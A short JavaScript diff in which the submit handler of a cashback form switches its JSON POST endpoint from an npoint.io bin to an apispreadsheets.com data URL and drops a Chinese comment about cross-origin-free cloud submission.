@@ -86,9 +86,8 @@ document.getElementById("cashbackForm").addEventListener("submit", async functio
         time: new Date().toLocaleString()
     };
 
-    // ✅✅✅ 全球通用无跨域云端提交
     try {
-        await fetch("https://api.npoint.io/8e80b48d21a8f4c3a27f", {
+        await fetch("https://api.apispreadsheets.com/data/179200/", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(data)
